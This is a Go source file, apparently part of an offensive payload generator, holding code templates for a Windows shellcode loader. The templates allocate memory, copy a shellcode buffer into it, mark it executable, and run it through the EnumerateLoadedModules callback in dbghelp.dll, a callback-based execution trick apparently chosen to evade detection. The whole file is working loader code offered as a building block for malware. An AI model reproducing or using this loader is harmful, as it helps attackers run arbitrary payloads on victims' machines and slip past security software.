package local

const EnumerateLoadedModules = `



	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		os.Exit(1)
	}
	_, _, errRtlMoveMemory :=  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		os.Exit(2)
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		os.Exit(3)
	}
	//Calling GetCurrentProcess to get a handle
	handle, _ := syscall.GetCurrentProcess()
	_, _, errenum := enumerateLoadedModules.Call(uintptr(handle),addr,0)
		if errenum != nil && errenum.Error() != "The operation completed successfully." {
			os.Exit(4)
	}

`

const EnumerateLoadedModulesDlls = `
	dbghelp := syscall.NewLazyDLL("dbghelp.dll")
	kernel32 := windows.NewLazySystemDLL("kernel32")

	enumerateLoadedModules := dbghelp.NewProc("EnumerateLoadedModules")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

`

const EnumerateLoadedModulesImports = `

	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"

	

`
